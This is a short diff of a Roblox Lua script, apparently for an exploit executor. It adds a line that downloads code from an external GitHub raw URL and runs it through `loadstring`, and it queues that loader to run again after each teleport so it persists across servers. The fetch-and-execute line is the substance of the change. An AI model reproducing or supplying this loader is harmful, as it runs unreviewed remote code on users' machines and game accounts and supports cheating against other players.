@@ -3,7 +3,7 @@ local HttpService = game:GetService("HttpService")
 local Market = game:GetService("MarketplaceService")
 local PlaceName = Market:GetProductInfo(game.PlaceId).Name
 local currentScript = [[
-loadstring(game:HttpGet('g'))()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/TuMeuT-Original/asf-/refs/heads/main/djpiska'))()
 ]]
 if queue_on_teleport then
 	queue_on_teleport(currentScript)
